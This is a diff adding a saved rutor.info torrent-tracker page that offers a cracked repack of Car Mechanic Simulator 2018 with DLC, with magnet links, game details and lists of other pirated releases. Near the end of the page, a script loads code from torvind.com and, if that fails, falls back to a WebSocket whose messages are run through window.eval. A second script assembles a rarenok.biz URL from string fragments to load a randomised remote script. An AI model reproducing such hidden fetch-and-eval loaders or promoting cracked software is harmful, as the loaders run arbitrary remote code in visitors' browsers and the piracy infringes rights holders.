@@ -1,0 +1,434 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Car Mechanic Simulator 2018 [v 1.5.16.HF2 + 9 DLC] (2017) PC | RePack от xatab</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Car Mechanic Simulator 2018 [v 1.5.16.HF2 + 9 DLC] (2017) PC | RePack от xatab</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:b7020ae51904a9ef45136c42d2b4a55436fa7a32&amp;dn=rutor.info_Car+Mechanic+Simulator+2018+%5Bv+1.5.16.HF2+%2B+9+DLC%5D+%282017%29+PC+%7C+RePack+%D0%BE%D1%82+xatab&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=624467"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/624467"><img src="http://s.rutor.info/t/down.png"> Скачать Car_Mechanic_Simulator_2018_by_xatab.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><center><img src="http://img12.lostpic.net/2017/10/27/a9044bfcef905af45488927cf2f921a0.png" /></center><img src="http://img12.lostpic.net/2017/10/27/60ec5c604df3a1bab043cb425ba6df26.png" style="float:right;" /><span style="font-family:Mistral;"><font size="6"><span style="color:#063f02;">ИНФ</span><span style="color:#095503;">ОР</span><span style="color:#0b7203;">МА</span><span style="color:#0d9002;">ЦИ</span><span style="color:#0fae03;">Я:</span></font></span><span style="font-family:Georgia;"><br />
+<span style="color:#237cb6;"><b>Дата выхода</b>:</span> 28 июля 2017<br />
+<span style="color:#237cb6;"><b>Жанр</b>:</span>  <a href="/tag/8/Simulator" target="_blank">Simulator</a>, <a href="/tag/8/Management" target="_blank">Management</a>, <a href="/tag/8/Racing" target="_blank">Racing</a>, <a href="/tag/8/3D" target="_blank">3D</a><br />
+<span style="color:#237cb6;"><b>Разработчик</b>:</span> Red Dot Games<br />
+<span style="color:#237cb6;"><b>Издатель</b>:</span> PlayWay S.A.		<br />
+<span style="color:#237cb6;"><b>Тип издания</b>:</span> RePack<br />
+<span style="color:#237cb6;"><b>Язык интерфейса</b>:</span> RUS|ENG|MULTi12<br />
+<span style="color:#237cb6;"><b>Язык озвучки</b>:</span> -<br />
+<span style="color:#237cb6;"><b>Таблетка</b>:</span> Вшита (CODEX)<br />
+<br />
+</span><span style="font-family:Mistral;"><font size="6"><span style="color:#063f02;">СИСТ</span><span style="color:#095503;">ЕМН</span><span style="color:#0b7203;">ЫЕ ТР</span><span style="color:#0d9002;">ЕБОВ</span><span style="color:#0fae03;">АНИЯ:</span></font></span><span style="font-family:Georgia;"><br />
+<span style="color:#542d11;"><b>✔ Операционная система</b>:</span> Windows 7 / Windows 8.1 / Windows 10 (64-bit)<br />
+<span style="color:#542d11;"><b>✔ Процессор</b>:</span> Intel Core i3 3.0 GHz<br />
+<span style="color:#542d11;"><b>✔ Оперативная память</b>:</span> 4 GB RAM<br />
+<span style="color:#542d11;"><b>✔ Видеокарта</b>:</span>  NVidia GeForce GTX 660 2GB VRAM (DirectX: Version 11)<br />
+<span style="color:#542d11;"><b>✔ Звуковая карта</b>:</span> Звуковое устройство, совместимое с DirectX® 11<br />
+<span style="color:#542d11;"><b>✔ Свободное место на жёстком диске</b>:</span> 16,6 GB<br />
+<br />
+</span><span style="font-family:Mistral;"><font size="6"><span style="color:#063f02;">ОП</span><span style="color:#095503;">ИС</span><span style="color:#0b7203;">АН</span><span style="color:#0d9002;">И</span><span style="color:#0fae03;">Е:</span></font></span><br />
+<span style="font-family:Georgia;"><span style="color:#746d6d;">Car Mechanic Simulator 2018 делает вызов игрокам. Управляй, ремонтируй, крась и тюнингуй автомобили. В новых модулях «Находки из сарая» и «Свалка металлолома» можно найти классические и уникальные автомобили. В опции «Компоновщик автомобиля» можно добавить свой собственный, самостоятельно построенный автомобиль. Строй и развивай свою собственную империю ремонтных услуг в этом необыкновенно подробном и реалистическом моделировании, в котором забота о деталях просто удивительная. А все это в новом фотореалистичном графическом оформлении. Мы предлагаем большее число автомобилей (более 40), больше инструментов (более 10), больше опций и больше частей (более 1000) чем когда-либо раньше. Пришло время засучить рукава и взяться за работу! Car Mechanic Simulator 2018 – это также автомобильные аукционы, во время которых можно покупать или продавать старые автомобили из Вашей коллекции. Новый фотографический режим позволяет делать превосходные фотографии до и после модификаций, а благодаря бесконечному числу наугад выбранных поручений и заказов будешь еще более занятым (и грязным).  Вне зависимости от уровня трудности временных ограничений, каждый заказ предлагает собственные исключительные вызовы. Покупай дополнительные инструменты в зависимости от потребностей. Можно в конце концов расширить свою мастерскую и добавить конкретное оборудование, такое как распылитель краски или склад частей.</span><br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Особенности игры:</div><div class="hidebody"></div><textarea class="hidearea"><b>Характерные черты игры Car Mechanic Simulator 2018 это</b>: <br />
+<br />
+<li> Фотореалистичная графика<br />
+<li> Более 40 автомобилей, работая с которыми вымажешь руки<br />
+<li> Более 10 инструментов, помогающих осмотреть автомобили<br />
+<li> Более 1000 ожидающих тебя частей<br />
+<li> Начни от маленькой мастерской, а затем расширь ее до полного размера, добавляя три подъемника. Мастерская станет настоящей «жемчужиной».<br />
+<li> Множество наугад выбранных заказов для выполнения<br />
+<li> Нескончаемый розыгрыш<br />
+<li> Многоуровневая парковка, на которой можно хранить свои автомобили<br />
+<li> Продвинутая система усовершенствований в игре (после перехода на следующий уровень можно тратить очки на усовершенствования)<br />
+<li> Диагностическая проверка для тестирования подвески автомобиля<br />
+<li> Трек для тестов, который позволяет проводить тестирование автомобиля (либо просто дает возможность подурачиться)<br />
+<li> Автодром, чтобы проверить параметры автомобиля<br />
+<li> Аукционы автомобилей – повышай ставки и конкурируй с другими оферентами<br />
+<li> Мастерская по покраске с разными типами красок и широким выбором оттенков (можно также полакировать один элемент, чтобы сэкономить деньги)<br />
+<li> «Находки из сарая» – здесь ты находишь брошенные автомобили в сараях – не забудь поискать в них разные части.<br />
+<li> «Свалка металлолома» (выискивай части и проржавевшие автомобили)<br />
+<li> «Компоновщик автомобиля» для мододелов (добавляй в игру свои автомобили!) <br />
+<br />
+<b>Новинки в сравнении с CMS 2015</b>: <br />
+<br />
+<li> сиденья, рули и задние кресла не заменяются<br />
+<li> с этого момента автомобильные окна – это также части<br />
+<li> Новая система ремонтов (более умный способ ремонта частей)<br />
+<li> склад частей (с этого момента можно хранить свои части на складе)<br />
+<li> сараи (модуль «Находки из сарая»)<br />
+<li> шины и диски являются теперь двумя отдельными частями (можно установить любую шину и диск)<br />
+<li> новый инструмент для ремонта амортизаторов<br />
+<li> новое зарядное устройство для аккумулятора<br />
+<li> новая шиномонтажная и балансировочная установка<br />
+<li> автодром (расположенный рядом с треком для тестирования и позволяющий измерять время проезда)<br />
+<li> новая система физики (намного более сложная)<br />
+<li> цвета автомобилей (можно нанести разные цвета на свой автомобиль)<br />
+<li> система повторной лакировки (каждую часть можно лакировать отдельно – выбери тип лака: матовый, металлик, перламутровый)<br />
+<li> поддержка для создания «модов» с 1 дня (поместить в игре собственные автомобили)<br />
+<li> создание собственных номерных знаков (вместе с поддержкой для «модов»)<br />
+<li> возможность добавления собственной музыки (вместе с музыкой пользователя)<br />
+<li> вынимание двигателя с помощью домкрата (Устал ли ты, поднимая автомобиль вверх и опуская его вниз для разборки двигателя?)<br />
+<li> создание нового двигателя на домкрате (с нуля)<br />
+<li> система горизонтального выравнивания (очки за опыт с усовершенствованиями)<br />
+<li> новый салон продаж (можно покупать новые автомобили)<br />
+<li> автомобильные жидкости<br />
+<li> история заказов (предварительно генерируемая похожим образом как в CMS 2014) рядом с генерируемыми заказами (похожим образом как в CMS 2015)<br />
+<li> новый интерфейс пользователя и более легкое управление (с возможностью изменения приписанных функций кнопок)<br />
+<li> поддержка для геймпадов<br />
+<li> ... и много-много всего <br />
+<br />
+<b>Официальные лицензированные марки, анонсированные для DLC</b>: <br />
+<br />
+<li> Mercedes<br />
+<li> Maserati<br />
+<li> DeLorean<br />
+<li> Pagani<br />
+<li> Bentley<br />
+<li> Dodge<br />
+<li> Plymouth<br />
+<li> Chrysler<br />
+<li> Jeep<br />
+<li> Ram<br />
+<li> Lotus<br />
+<li> Mazda</li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></li></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Особенности репака:</div><div class="hidebody"></div><textarea class="hidearea">» За основу взят релиз от RELOADED<br />
+» Ничего не вырезано / Ничего не перекодировано<br />
+» Игровые архивы не вскрыты<br />
+» Пропатчено до версии <a href="http://steamcommunity.com/app/645630/discussions/0/1470840994963192464/" target="_blank">1.5.16.HF2</a><br />
+» DLC:<br />
+<li> Car Mechanic Simulator 2018 - Dodge<br />
+<li> Car Mechanic Simulator 2018 - Mazda<br />
+<li> Car Mechanic Simulator 2018 - Jeep DLC<br />
+<li> Car Mechanic Simulator 2018 - Tuning DLC<br />
+<li> Car Mechanic Simulator 2018 - Plymouth<br />
+<li> Car Mechanic Simulator 2018 - Bentley Remastered DLC<br />
+<li> Car Mechanic Simulator 2018 - Garage Customization DLC<br />
+<li> Car Mechanic Simulator 2018 - Lotus DLC<br />
+<li> Car Mechanic Simulator 2018 - Pagani DLC<br />
+» Выведен ярлык на рабочий стол для запуска редактора машин<br />
+» Время установки 10 минут на HDD (Зависит от компьютера)<br />
+» Repack от xatab</li></li></li></li></li></li></li></li></li></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Разбиваем на DVD:</div><div class="hidebody"></div><textarea class="hidearea"><li> 1-DVD5: autorun.inf, setup.exe, data.bin, data1.bin<br />
+<li> 2-DVD9: Redist/* data2.bin, data3.bin</li></li></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Особенности патча:</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://steamcommunity.com/app/645630/discussions/0/1470840994963192464/" target="_blank">http://steamcommunity.com/app/645630/discussions/0/1470840994963192464/</a></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты | повтор:</div><div class="hidebody"></div><textarea class="hidearea"><center><a href="http://radikal.ru/f/s019.radikal.ru/i625/1707/cc/c74732de1870.jpg.html" target="_blank"><img src="http://s019.radikal.ru/i625/1707/cc/c74732de1870t.jpg" /></a> <a href="http://radikal.ru/f/s019.radikal.ru/i612/1707/db/f5832dc932e8.jpg.html" target="_blank"><img src="http://s019.radikal.ru/i612/1707/db/f5832dc932e8t.jpg" /></a> <a href="http://radikal.ru/f/s019.radikal.ru/i603/1707/ef/2b966437c400.jpg.html" target="_blank"><img src="http://s019.radikal.ru/i603/1707/ef/2b966437c400t.jpg" /></a> <a href="http://radikal.ru/f/s018.radikal.ru/i514/1707/42/835a8c27daf9.jpg.html" target="_blank"><img src="http://s018.radikal.ru/i514/1707/42/835a8c27daf9t.jpg" /></a></center></textarea></div><center></span><center><br />
+<hr /><a href="http://all-poster.ru/?v=mz8ollht.jpg" target="_blank"><img src="http://all-poster.ru/thumbs/mz8ollht.jpg" /></a> <a href="http://all-poster.ru/?v=rcyc3ozp.jpg" target="_blank"><img src="http://all-poster.ru/thumbs/rcyc3ozp.jpg" /></a> <a href="http://all-poster.ru/?v=fy6h387b.jpg" target="_blank"><img src="http://all-poster.ru/thumbs/fy6h387b.jpg" /></a> <a href="http://all-poster.ru/?v=x230o5pl.jpg" target="_blank"><img src="http://all-poster.ru/thumbs/x230o5pl.jpg" /></a> <a href="http://all-poster.ru/?v=0na8ptc9.jpg" target="_blank"><img src="http://all-poster.ru/thumbs/0na8ptc9.jpg" /></a><hr /><br />
+<span style="color:#063f02;"><b>Торрент перезалит. Пропатчено до версии 1.5.16.HF2.<br />
+Обновлено 08.05.2018 г. Кто ранее скачал перехеширутесь.</b></span><br />
+<br />
+<hr /><br />
+</center></center></td></tr>
+
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/games" target="_blank">Игры </a></td></tr>
+<tr><td class="header">Раздают</td><td>51</td></tr>
+<tr><td class="header">Качают</td><td>25</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 7:19:05 (20 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 15:26:58  (16 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>8.62&nbsp;GB  (9257082083 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 624467);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>28&nbsp;Апр&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/578796"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:96387605b993bb018522cb0f69886d06ade177d7&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/578796/car-mechanic-simulator-2018-v-1.5.16.hf1-9-dlc-2017-pc-repack-ot-qoob">Car Mechanic Simulator 2018 [v 1.5.16.HF1 + 9 DLC] (2017) PC | RePack от qoob </a></td> <td align="right">257<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">8.70&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;252</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;18</span></td></tr><tr class="tum"><td>08&nbsp;Апр&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/624916"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:94978a93598651cdb0e9716a64b4d3d265053652&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/624916/car-mechanic-simulator-2018-v-1.5.15.hf1-9-dlc-2017-pc-repack-ot-fitgirl">Car Mechanic Simulator 2018 [v 1.5.15.HF1 + 9 DLC] (2017) PC | RePack от FitGirl </a></td> 
+<td align="right">7.78&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;30</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="gai"><td>03&nbsp;Апр&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/623786"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:ed9899498999b75eb136edaec834a39f7fa62198&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/623786/car-mechanic-simulator-2018-v-1.5.14-9-dlc-2017-pc-licenzija">Car Mechanic Simulator 2018 [v 1.5.14 + 9 DLC] (2017) PC | Лицензия </a></td> 
+<td align="right">10.61&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;8</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="tum"><td>02&nbsp;Апр&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/623740"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:7d097cfec1abbdad206813416258d0652720f052&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/623740/car-mechanic-simulator-2018-v-1.5.14-9-dlc-2017-pc-repack-ot-spacex">Car Mechanic Simulator 2018 [v 1.5.14 + 9 DLC] (2017) PC | RePack от SpaceX </a></td> 
+<td align="right">8.80&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>28&nbsp;Июл&nbsp;17</td><td ><a class="downgif" href="http://d.rutor.info/download/578774"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c2a52f8d1ceeabc7bfd71bf8c2d8c767eac751c3&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/578774/car-mechanic-simulator-2018-2017-pc-licenzija">Car Mechanic Simulator 2018 (2017) PC | Лицензия </a></td> <td align="right">5<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">9.25&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/8/0/0/Car Mechanic Simulator 2018" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/624467.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (8)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=624467">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(624467);">Промодерировать раздачу</span> | <span onclick="confirm_delete(624467);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/624467">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
